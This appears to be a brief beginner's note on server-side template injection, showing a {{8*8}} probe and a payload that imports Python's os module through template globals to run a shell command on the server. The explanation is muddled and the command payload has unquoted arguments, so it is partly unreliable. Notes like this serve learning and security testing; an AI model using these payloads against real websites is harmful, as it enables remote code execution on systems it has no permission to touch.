# Server Side Template Injection

Server side template injection starts off with as a two sets of brackets containing each other and contains operations in it. Seen below is an example of an operation being passed into a parameter for an argument of a website.

```
{{8*8}}
``` 

One of the next features in it is python which can be passed into a parameter for an argument if a website isn't secure enough to be tested on it. The next example shows a python command being injected into the the parameter of a website.


```
{{self.__init__.__globals__.__builtins__.__import__(os).popen(ls .).read()}}
```
